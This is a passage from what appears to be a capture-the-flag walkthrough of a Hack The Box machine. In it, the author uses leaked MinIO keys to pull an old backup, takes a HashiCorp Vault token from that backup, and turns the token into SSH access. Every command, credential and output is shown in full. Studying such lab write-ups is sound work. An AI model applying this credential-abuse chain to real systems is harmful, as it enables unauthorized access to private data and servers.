</span></span></span><span class=line><span class=cl><span class=go>  anonymous  manage anonymous access to buckets and objects
</span></span></span><span class=line><span class=cl><span class=go>  batch      manage batch jobs
</span></span></span><span class=line><span class=cl><span class=go>  cp         copy objects
</span></span></span><span class=line><span class=cl><span class=go>  cat        display object contents
</span></span></span><span class=line><span class=cl><span class=go>  diff       list differences in object name, size, and date between two buckets
</span></span></span><span class=line><span class=cl><span class=go>  du         summarize disk usage recursively
</span></span></span><span class=line><span class=cl><span class=go>  encrypt    manage bucket encryption config
</span></span></span><span class=line><span class=cl><span class=go>  event      manage object notifications
</span></span></span><span class=line><span class=cl><span class=go>  find       search for objects
</span></span></span><span class=line><span class=cl><span class=go>  get        get s3 object to local
</span></span></span><span class=line><span class=cl><span class=go>  head       display first &#39;n&#39; lines of an object
</span></span></span><span class=line><span class=cl><span class=go>  ilm        manage bucket lifecycle
</span></span></span><span class=line><span class=cl><span class=go>  idp        manage MinIO IDentity Provider server configuration
</span></span></span><span class=line><span class=cl><span class=go>  license    license related commands
</span></span></span><span class=line><span class=cl><span class=go>  legalhold  manage legal hold for object(s)
</span></span></span><span class=line><span class=cl><span class=go>  ls         list buckets and objects
</span></span></span><span class=line><span class=cl><span class=go>  mb         make a bucket
</span></span></span><span class=line><span class=cl><span class=go>  mv         move objects
</span></span></span><span class=line><span class=cl><span class=go>  mirror     synchronize object(s) to a remote site
</span></span></span><span class=line><span class=cl><span class=go>  od         measure single stream upload and download
</span></span></span><span class=line><span class=cl><span class=go>  ping       perform liveness check
</span></span></span><span class=line><span class=cl><span class=go>  pipe       stream STDIN to an object
</span></span></span><span class=line><span class=cl><span class=go>  put        upload an object to a bucket
</span></span></span><span class=line><span class=cl><span class=go>  quota      manage bucket quota
</span></span></span><span class=line><span class=cl><span class=go>  rm         remove object(s)
</span></span></span></code></pre></div><p>Searching for <a href=https://min.io/docs/minio/linux/index.html class=external-link target=_blank rel=noopener>documentation</a> for this binary we have that we have to run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>mc alias set &lt;alias&gt; &lt;endpoint&gt; &lt;access-key&gt; &lt;secret-key&gt;
</span></span></span></code></pre></div><p>where <code>&lt;alias></code> is how we will name the connection, <code>&lt;endpoint></code> is the url of the <code>MinIO</code> service, <code>&lt;access-key></code> access key or username, and <code>&lt;secret-key></code> is the password or secret key.</p><p>Once added we can check all the resources running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>mc ls --recursive --versions &lt;alias&gt;
</span></span></span></code></pre></div><p>So, in my case, I will name the connection as <code>leaked</code>. So I run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./mc alias set leaked http://prd23-s3-backend.skyfall.htb/ 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>mc: Configuration written to `/home/gunzf0x/.mc/config.json`. Please update your access credentials.
</span></span></span><span class=line><span class=cl><span class=go>mc: Successfully created `/home/gunzf0x/.mc/share`.
</span></span></span><span class=line><span class=cl><span class=go>mc: Initialized share uploads `/home/gunzf0x/.mc/share/uploads.json` file.
</span></span></span><span class=line><span class=cl><span class=go>mc: Initialized share downloads `/home/gunzf0x/.mc/share/downloads.json` file.
</span></span></span><span class=line><span class=cl><span class=go>Added `leaked` successfully.
</span></span></span></code></pre></div><p>and check its content:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./mc ls --recursive --versions leaked
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[2023-11-08 01:59:15 -03]     0B askyy/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:35:28 -03]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-09 18:37:25 -03] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-09 18:37:09 -03] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-09 18:36:30 -03] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 01:58:56 -03]     0B btanner/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:35:36 -03]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 01:58:33 -03]     0B emoneypenny/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:35:56 -03]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 01:58:22 -03]     0B gmallory/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:36:02 -03]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-07 21:08:01 -03]     0B guest/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-07 21:08:05 -03]  48KiB STANDARD null v1 PUT guest/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 01:59:05 -03]     0B jbond/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:35:45 -03]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 01:58:10 -03]     0B omansfield/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:36:09 -03]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 01:58:45 -03]     0B rsilva/
</span></span></span><span class=line><span class=cl><span class=go>[2023-11-08 02:35:51 -03]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf
</span></span></span></code></pre></div><p>where I can see a backup file called at <code>askyy/home_backup.tar</code></p><p>Now, we can copy files running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>mc cp &lt;path-inside-alias&gt; &lt;outfile-name&gt; 
</span></span></span></code></pre></div><p>so I run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./mc cp --recursive leaked/askyy/home_backup.tar.gz ./home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>...b/askyy/home_backup.tar.gz: 2.48 KiB / 2.48 KiB ‚îÉ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚îÉ 1.97 KiB/s 1s
</span></span></span></code></pre></div><p>I extract these files, and check that we get some files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cd home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 12
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x 4096 May 19 20:19 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 gunzf0x gunzf0x 4096 May 19 20:20 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 2543 May 19 20:19 home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ tar -xzvf home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>./
</span></span></span><span class=line><span class=cl><span class=go>./.profile
</span></span></span><span class=line><span class=cl><span class=go>./.bashrc
</span></span></span><span class=line><span class=cl><span class=go>./.ssh/
</span></span></span><span class=line><span class=cl><span class=go>./.ssh/authorized_keys
</span></span></span><span class=line><span class=cl><span class=go>./.sudo_as_admin_successful
</span></span></span><span class=line><span class=cl><span class=go>./.bash_history
</span></span></span><span class=line><span class=cl><span class=go>./.bash_logout
</span></span></span><span class=line><span class=cl><span class=go>./.cache/
</span></span></span><span class=line><span class=cl><span class=go>./.cache/motd.legal-displayed
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 36
</span></span></span><span class=line><span class=cl><span class=go>drwxr-x--- 4 gunzf0x gunzf0x 4096 Nov  9  2023 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 gunzf0x gunzf0x 4096 May 19 20:20 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    1 Nov  9  2023 .bash_history
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x  220 Jan  6  2022 .bash_logout
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 3771 Nov  9  2023 .bashrc
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 gunzf0x gunzf0x 4096 Oct  9  2023 .cache
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 2543 May 19 20:19 home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x  807 Jan  6  2022 .profile
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 gunzf0x gunzf0x 4096 Nov  9  2023 .ssh
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    0 Oct  9  2023 .sudo_as_admin_successful
</span></span></span></code></pre></div><p>but got nothing interesting</p><p>At this dead point I remember that we had different versions for <code>askyy/home_backup.tar.gz</code>. I assume that these are different &ldquo;logs/tags&rdquo; assigned when we make changes. One of the versions was <code>2b75346d-2a47-4203-ab09-3c9f878466b8</code> for the backup file. So I download specifically that version:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./mc cp --vid 2b75346d-2a47-4203-ab09-3c9f878466b8 leaked/askyy/home_backup.tar.gz ./home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>...b/askyy/home_backup.tar.gz: 2.64 KiB / 2.64 KiB ‚îÉ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚îÉ 2.39 KiB/s 1s
</span></span></span></code></pre></div><p>and extract its content.</p><p>If I check the decompressed content it is similar as the previous decompressed file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 36
</span></span></span><span class=line><span class=cl><span class=go>drwxr-x--- 4 gunzf0x gunzf0x 4096 Nov  9  2023 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 5 gunzf0x gunzf0x 4096 May 19 18:21 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    1 Nov  9  2023 .bash_history
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x  220 Jan  6  2022 .bash_logout
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 3953 Nov  9  2023 .bashrc
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 gunzf0x gunzf0x 4096 Oct  9  2023 .cache
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 2705 May 19 20:27 home_backup.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x  807 Jan  6  2022 .profile
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 gunzf0x gunzf0x 4096 Nov  9  2023 .ssh
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    0 Oct  9  2023 .sudo_as_admin_successful
</span></span></span></code></pre></div><p>but <code>.bashrc</code> file is slightly different:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat .bashrc
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span> ~/.bashrc: executed by bash<span class=o>(</span>1<span class=o>)</span> <span class=k>for</span> non-login shells.
</span></span><span class=line><span class=cl><span class=gp>#</span> see /usr/share/doc/bash/examples/startup-files <span class=o>(</span>in the package bash-doc<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=gp>#</span> <span class=k>for</span> examples
</span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>export VAULT_API_ADDR=&#34;http://prd23-vault-internal.skyfall.htb&#34;
</span></span></span><span class=line><span class=cl><span class=go>export VAULT_TOKEN=&#34;hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&#34;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>so we have a <code>VAULT_TOKEN</code> and another domain <code>prd23-vault-internal.skyfall.htb</code></p><p>I add this new domain to my <code>/etc/hosts</code> file, so now it looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat /etc/hosts | tail -n 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.254 skyfall.htb demo.skyfall.htb prd23-s3-backend.skyfall.htb prd23-vault-internal.skyfall.htb
</span></span></span></code></pre></div><p>Searching for this <code>VAULT_TOKEN</code> variable, we find that it is used for <code>HashiCorp Vault</code>:</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content><code>HashiCorp Vault</code> is a powerful tool designed for securely managing secrets and protecting sensitive data. It is part of the HashiCorp suite of infrastructure management tools</div></div><p>We download <code>HashiCorp Vault</code> binary for <code>Linux</code> with <code>wget</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wget https://releases.hashicorp.com/vault/1.16.2/vault_1.16.2_linux_amd64.zip
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-05-19 20:38:13--  https://releases.hashicorp.com/vault/1.16.2/vault_1.16.2_linux_amd64.zip
</span></span></span><span class=line><span class=cl><span class=go>Resolving releases.hashicorp.com (releases.hashicorp.com)... 3.162.221.26, 3.162.221.105, 3.162.221.48, ...
</span></span></span><span class=line><span class=cl><span class=go>Connecting to releases.hashicorp.com (releases.hashicorp.com)|3.162.221.26|:443... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 143229555 (137M) [application/zip]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äòvault_1.16.2_linux_amd64.zip‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>vault_1.16.2_linux_amd64.zip               100%[=======================================================================================&gt;] 136.59M  55.9MB/s    in 2.4s
</span></span></span></code></pre></div><p>Export the values found:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ export VAULT_API_ADDR=&#34;http://prd23-vault-internal.skyfall.htb&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ export VAULT_TOKEN=&#34;hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ export VAULT_ADDR=&#34;http://prd23-vault-internal.skyfall.htb&#34;
</span></span></span></code></pre></div><p>and run <code>HashiCorp Vault</code> binary:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./vault login
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Token (will be hidden): hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
</span></span></span><span class=line><span class=cl><span class=go>WARNING! The VAULT_TOKEN environment variable is set! The value of this
</span></span></span><span class=line><span class=cl><span class=go>variable will take precedence; if this is unwanted please unset VAULT_TOKEN or
</span></span></span><span class=line><span class=cl><span class=go>update its value accordingly.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Success! You are now authenticated. The token information displayed below
</span></span></span><span class=line><span class=cl><span class=go>is already stored in the token helper. You do NOT need to run &#34;vault login&#34;
</span></span></span><span class=line><span class=cl><span class=go>again. Future Vault requests will automatically use this token.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Key                  Value
</span></span></span><span class=line><span class=cl><span class=go>---                  -----
</span></span></span><span class=line><span class=cl><span class=go>token                hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
</span></span></span><span class=line><span class=cl><span class=go>token_accessor       rByv1coOBC9ITZpzqbDtTUm8
</span></span></span><span class=line><span class=cl><span class=go>token_duration       433388h16m12s
</span></span></span><span class=line><span class=cl><span class=go>token_renewable      true
</span></span></span><span class=line><span class=cl><span class=go>token_policies       [&#34;default&#34; &#34;developers&#34;]
</span></span></span><span class=line><span class=cl><span class=go>identity_policies    []
</span></span></span><span class=line><span class=cl><span class=go>policies             [&#34;default&#34; &#34;developers&#34;]
</span></span></span></code></pre></div><p>where, as a token, I just passed the value of the variable <code>VAULT_TOKEN</code> found.</p><p>We can then enumerate the different roles:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./vault token capabilities ssh/roles
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>list
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ./vault list ssh/roles
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Keys
</span></span></span><span class=line><span class=cl><span class=go>----
</span></span></span><span class=line><span class=cl><span class=go>admin_otp_key_role
</span></span></span><span class=line><span class=cl><span class=go>dev_otp_key_role
</span></span></span></code></pre></div><p>If we try to log in with <code>admin_otp_key_role</code> via <code>SSH</code> this did not work:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./vault ssh -role admin_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.10.11.254
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>failed to generate credential: failed to get credentials: Error making API request.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>URL: PUT http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/admin_otp_key_role
</span></span></span><span class=line><span class=cl><span class=go>Code: 403. Errors:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>* 1 error occurred:
</span></span></span><span class=line><span class=cl><span class=go>        * permission denied
</span></span></span></code></pre></div><p>but if we use <code>dev_otp_key_role</code> key, we can log in via <code>SSH</code> as <code>askyy</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./vault ssh -role dev_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.10.11.254
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Permanently added &#39;10.10.11.254&#39; (ED25519) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=go>Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> * Documentation:  https://help.ubuntu.com
</span></span></span><span class=line><span class=cl><span class=go> * Management:     https://landscape.canonical.com
</span></span></span><span class=line><span class=cl><span class=go> * Support:        https://ubuntu.com/pro
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>This system has been minimized by removing packages and content that are
</span></span></span><span class=line><span class=cl><span class=go>not required on a system that users do not log into.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>To restore this content, you can run the &#39;unminimize&#39; command.
</span></span></span><span class=line><span class=cl><span class=go>askyy@skyfall:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>askyy
</span></span></span></code></pre></div><p>We can get the user flag at <code>askyy</code> home directory.</p><p>Before continuing, let&rsquo;s try to see the content of <code>dev_otp_key_role</code>. We might (and will) need it for later if we need to connect via <code>SSH</code> as <code>askyy</code> user in multiple sessions.
Searching how to read <code>key</code> files in <code>HashiCorp Vault</code> we find <a href=https://developer.hashicorp.com/vault/docs/commands/read class=external-link target=_blank rel=noopener>this documentation explaining it</a>. But following those instructions returns an error:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./vault read ssh/creds/dev_otp_key_role
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Error reading ssh/creds/dev_otp_key_role: Error making API request.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>URL: GET http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/dev_otp_key_role
</span></span></span><span class=line><span class=cl><span class=go>Code: 405. Errors:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>* 1 error occurred:
</span></span></span><span class=line><span class=cl><span class=go>        * unsupported operation
</span></span></span></code></pre></div><p>So we are not allowed to read it.</p><p>However, reading more I find that we are also able to generate new credentials based on <a href=https://developer.hashicorp.com/vault/api-docs/secret/ssh#generate-ssh-credentials class=external-link target=_blank rel=noopener>this documentation</a>. If we try to generate credentials, it asks for an IP address:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s --request POST --header &#34;X-Vault-Token: hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&#34; http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/dev_otp_key_role
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{&#34;errors&#34;:[&#34;Missing ip&#34;]}
</span></span></span></code></pre></div><p>If we pass as data the IP address of the victim machine, now it returns data for a user <code>nobody</code>; a user that exists on <code>/etc/passwd</code> file of the victim machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s --request POST --header &#34;X-Vault-Token: hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&#34; http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/dev_otp_key_role -d &#39;{&#34;ip&#34;:&#34;10.10.11.254&#34;}&#39; | jq
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{
</span></span></span><span class=line><span class=cl><span class=go>  &#34;request_id&#34;: &#34;39d8264b-c279-7b86-3605-1933b7c455af&#34;,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;lease_id&#34;: &#34;ssh/creds/dev_otp_key_role/Y7D1NrPXje3w6xRmGjygS3Fi&#34;,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;renewable&#34;: false,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;lease_duration&#34;: 2764800,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;data&#34;: {
</span></span></span><span class=line><span class=cl><span class=go>    &#34;ip&#34;: &#34;10.10.11.254&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;key&#34;: &#34;1c3be6fe-dd3f-26cf-7a95-572aaae479e9&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;key_type&#34;: &#34;otp&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;port&#34;: 22,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;username&#34;: &#34;nobody&#34;
</span></span></span><span class=line><span class=cl><span class=go>  },
</span></span></span><span class=line><span class=cl><span class=go>  &#34;wrap_info&#34;: null,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;warnings&#34;: null,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;auth&#34;: null
</span></span></span><span class=line><span class=cl><span class=go>}
